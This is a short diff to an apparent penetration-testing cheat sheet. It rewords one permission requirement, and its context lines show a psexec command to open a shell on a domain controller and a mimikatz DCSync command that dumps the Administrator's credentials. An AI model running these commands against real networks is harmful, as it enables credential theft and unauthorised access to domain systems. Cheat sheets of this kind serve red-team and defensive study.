@@ -366,7 +366,7 @@ misc::cmd(launch a new command prompt)
 psexec.exe \\dc01 cmd.exe
 ```
 #### Domain Controller SynchronizationZ
-Require domain admin account
+Require Administrator account
 ```
 lsadump::dcsync /user:Administrator
 ```
